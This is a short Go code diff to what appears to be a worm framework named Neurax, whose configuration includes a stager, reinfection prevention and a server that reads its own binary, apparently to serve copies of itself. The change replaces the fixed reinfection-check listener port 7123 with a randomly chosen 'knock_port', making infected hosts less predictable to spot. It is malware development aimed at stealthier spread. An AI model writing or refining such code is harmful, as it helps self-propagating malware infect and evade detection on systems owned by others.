@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"os"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 
@@ -22,6 +23,7 @@ import (
 type __neurax_config struct {
 	stager           string
 	port             int
+	knock_port       string
 	prevent_reinfect bool
 	local_ip         string
 	path             string
@@ -38,6 +40,7 @@ type __neurax_config struct {
 var neurax_config = __neurax_config{
 	stager:           "random",
 	port:             random_int(2222, 9999),
+	knock_port:       strconv.Itoa(random_int(2222, 9999)),
 	required_port:    0,
 	prevent_reinfect: true,
 	local_ip:         get_local_ip(),
@@ -215,7 +218,7 @@ func neurax_stager() string {
 
 func neurax_server() {
 	if neurax_config.prevent_reinfect {
-		go net.Listen("tcp", "0.0.0.0:7123")
+		go net.Listen("tcp", "0.0.0.0:"+neurax_config.knock_port)
 	}
 	data, _ := ioutil.ReadFile(os.Args[0])
 	if neurax_config.base64 {
